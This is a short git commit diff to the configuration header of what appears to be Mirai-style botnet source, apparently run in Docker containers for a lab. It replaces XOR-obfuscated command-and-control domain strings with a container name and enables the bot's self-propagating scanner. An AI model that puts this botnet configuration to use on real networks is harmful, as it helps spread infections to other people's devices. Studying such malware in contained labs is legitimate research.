07ae12b4682afdcee02198e691d55eaaaddf19ba
vbox <luigi.delleva@gmail.com>
2024-05-16 10:49:02 +0200

    added fixed container names

--- bot/config.h
+++ bot/config.h
@@ -1,12 +1,12 @@
 #ifndef CONFIG_H 
 #define CONFIG_H 
-#define DOMAIN_NAME "\x4F\x4B\x50\x43\x4B\x7D\x4C\x47\x56\x51\x47\x41\x0F\x41\x4C\x41\x0F\x13\x22"
-#define DOMAIN_NAME_LEN 19
-#define SCAN_DOMAIN_NAME "\x4F\x4B\x50\x43\x4B\x7D\x4C\x47\x56\x51\x47\x41\x0F\x41\x4C\x41\x0F\x13\x22"
-#define SCAN_DOMAIN_NAME_LEN 19
+#define DOMAIN_NAME "\x4F\x4B\x50\x43\x4B\x0F\x41\x4C\x41\x22"
+#define DOMAIN_NAME_LEN 10
+#define SCAN_DOMAIN_NAME "\x4F\x4B\x50\x43\x4B\x0F\x41\x4C\x41\x22"
+#define SCAN_DOMAIN_NAME_LEN 10
 #define DNS_0 127
 #define DNS_1 0
 #define DNS_2 0
 #define DNS_3 11
-// #define INIT_SCANNER
+#define INIT_SCANNER
 #endif
